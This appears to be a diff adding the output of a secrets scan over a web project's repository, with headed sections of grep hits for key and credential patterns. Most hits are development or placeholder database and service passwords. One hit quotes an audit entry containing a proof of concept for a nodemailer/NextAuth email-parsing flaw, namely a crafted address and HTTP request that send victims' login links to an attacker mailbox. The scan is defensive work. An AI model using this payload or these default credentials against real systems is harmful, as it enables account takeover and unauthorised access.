@@ -1,0 +1,58 @@
+=== ANTHROPIC ===
+(none)
+
+=== GOOGLE_AI / AIza ===
+(none)
+
+=== OPENAI/GENERIC sk- ===
+(none)
+
+=== AWS access key ===
+(none)
+
+=== Postgres URL with cred ===
+.env.example:21:DATABASE_URL=postgresql://kku:kku_dev_password@localhost:5432/program_landscape?schema=public
+.env.prod.example:60:DATABASE_URL=postgresql://kku_prod:REPLACE_ME_in_secrets_file@postgres:5432/program_landscape?schema=public
+.github/workflows/pr.yml:72:          DATABASE_URL: postgresql://kku:kku@localhost:5432/kku_landscape?schema=public
+.github/workflows/pr.yml:77:          DATABASE_URL: postgresql://kku:kku@localhost:5432/kku_landscape?schema=public
+.github/workflows/pr.yml:83:          DATABASE_URL: postgresql://kku:kku@localhost:5432/kku_landscape?schema=public
+DEPLOYMENT.md:239:| `DATABASE_URL` | `postgresql://<pg_user>:<pg_password>@postgres:5432/program_landscape?schema=public` — same credentials as `/opt/program-landscape/secrets/postgres_{user,password}` |
+docs/migration-policy.md:60:For local diffs, set `SHADOW_DATABASE_URL=postgresql://kku:kku@localhost:5433/shadow` and spin a throwaway Postgres (`docker run -d --name shadow-pg -e POSTGRES_PASSWORD=kku -p 5433:5432 postgis/postgis:16-3.4`). Required for `prisma migrate diff --from-migrations`.
+docs/production-infrastructure.md:243:| `DATABASE_URL` | `postgresql://<user>:<pw>@postgres:5432/program_landscape?schema=public` (credentials match secrets files) |
+
+=== Mysql/Mssql URL with cred ===
+(none)
+
+=== JWT (eyJ.eyJ.) ===
+(none)
+
+=== Long 64-hex (NEXTAUTH_SECRET-shape) ===
+docs/security-review-audit-2026-04-24.json:329:      "overview": "### Summary\n\nNextAuth.js's email sign-in can be forced to deliver authentication emails to an attacker-controlled mailbox due to a bug in `nodemailer`'s address parser used by the project (fixed in `nodemailer` **v7.0.7**). A crafted input such as:\n\n```\n\"e@attacker.com\"@victim.com\n```\n\nis parsed incorrectly and results in the message being delivered to `e@attacker.com` (attacker) instead of `\"<e@attacker.com>@victim.com\"` (the intended recipient at `victim.com`) in violation of RFC 5321/5322 semantics. This allows an attacker to receive login/verification links or other sensitive emails intended for the victim.\n\n<h2>Affected NextAuthjs Version</h2>\n\n≤ Version | Afftected\n-- | --\n4.24.11 | Yes\n5.0.0-beta.29 | Yes\n\n\n## POC\n\nExample Setup showing misdelivery of email \n\n```jsx\nimport NextAuth from \"next-auth\"\nimport Nodemailer from \"next-auth/providers/nodemailer\"\nimport { PrismaAdapter } from \"@auth/prisma-adapter\"\nimport { prisma } from \"@/lib/prisma\"\n\nexport const { handlers, auth, signIn, signOut } = NextAuth({\n  adapter: PrismaAdapter(prisma),\n  providers: [\n    Nodemailer({\n      server: {\n        host: \"127.0.0.1\",\n        port: 1025,\n        ...\n      },\n      from: \"noreply@authjs.dev\",\n    }),\n  ],\n  pages: {\n    signIn: '/auth/signin',\n    verifyRequest: '/auth/verify-request',\n  },\n})\n\n```\n\n```jsx\nPOST /api/auth/signin/nodemailer HTTP/1.1\nAccept-Encoding: gzip, deflate, br, zstd\nCache-Control: no-cache\nConnection: keep-alive\nContent-Length: 176\nDNT: 1\nHost: localhost:3000\nOrigin: http://localhost:3000\nPragma: no-cache\nReferer: http://localhost:3000/auth/signin\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36\naccept: */*\naccept-language: en-US,en;q=0.9,ta;q=0.8\ncontent-type: application/x-www-form-urlencoded\nsec-ch-ua: \"Google Chrome\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Linux\"\nx-auth-return-redirect: 1\n\nemail=%22e%40attacker.coccm%22%40victim.com&csrfToken=90f5e6f48ab577ab011f212011862dcfe546459c23764cf891aab2d176f8d77a&callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fauth%2Fsignin\n```\n\n<img width=\"1247\" height=\"1408\" alt=\"Screenshot from 2025-10-25 21-15-25\" src=\"https://github.com/user-attachments/assets/456968a3-14ce-42b4-b8ca-f25b9351cf0f\" />\n<img width=\"1279\" height=\"1450\" alt=\"Screenshot from 2025-10-25 21-14-47\" src=\"https://github.com/user-attachments/assets/4e665b66-9bfe-43ce-abd3-97880972218f\" />\n\n# Mitigation\n\nUpdate to nodemailer 7.0.7\n\n## Credits\n\nhttps://zeropath.com/  Helped identify this security issue",
+
+=== Inline password= or PASSWORD= with non-placeholder value ===
+.github/workflows/pr.yml:85:          NEXTAUTH_SECRET: test-secret-please-override-for-anything-real
+.github/workflows/release.yml:67:          NEXTAUTH_SECRET: ci-placeholder-secret-do-not-use
+apps/api/src/common/jwt-auth.guard.ts:42:  private readonly secret: Uint8Array;
+apps/web/src/lib/auth.ts:42:        const password = credentials?.password;
+apps/web/src/lib/kku/employee-api.ts:128:  const clientSecret = envOrThrow('KKU_API_CLIENT_SECRET');
+docker-compose.yml:15:      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-kku_dev_password}
+docker-compose.yml:49:      MINIO_ROOT_PASSWORD: ${MINIO_ROOT_PASSWORD:-minio_dev_password}
+
+=== PRIVATE KEY headers ===
+(none)
+=== Elsevier/Scopus apikey ===
+(none)
+
+=== KKU SCOPUS keys / Scopus apikey= ===
+(none)
+
+=== Generic base64-shape near 'token'/'key'/'secret' ===
+
+=== KKU IP + cred coupling ===
+(none)
+
+=== Slack/Discord/GitHub-token shapes ===
+(none)
+
+=== KMITL_SECRET_KEY/CLIENT_ID populated values ===
+(none)
